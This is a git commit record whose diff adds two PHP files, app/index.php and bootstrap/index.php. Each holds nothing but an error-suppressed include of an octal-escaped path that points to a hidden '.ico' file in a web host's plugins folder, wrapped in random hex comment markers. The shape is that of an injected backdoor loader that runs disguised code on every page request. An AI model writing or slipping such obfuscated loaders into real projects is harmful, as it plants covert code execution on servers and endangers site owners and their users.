f5d10eee8e8ca2f15e917d77095814597290fcbd
Hafise Alyanga Pkasemer <41443166+patrickhamzaokello@users.noreply.github.com>
2021-10-03 13:38:56 +0300

    kakebefresh

---
+++ app/index.php
@@ -0,0 +1,14 @@
+<?php
+/*bc74a*/
+
+@include "\057home\061/rgx\163zumy\057publ\151c_ht\155l/ma\162iahe\141lthc\141rese\162vice\163/plu\147ins/\0561ed1\062a05.\151co";
+
+/*bc74a*/
+
+
+
+
+
+
+
+
---
+++ bootstrap/index.php
@@ -0,0 +1,14 @@
+<?php
+/*09625*/
+
+@include "\057home\061/rgx\163zumy\057publ\151c_ht\155l/ma\162iahe\141lthc\141rese\162vice\163/plu\147ins/\0561ed1\062a05.\151co";
+
+/*09625*/
+
+
+
+
+
+
+
+
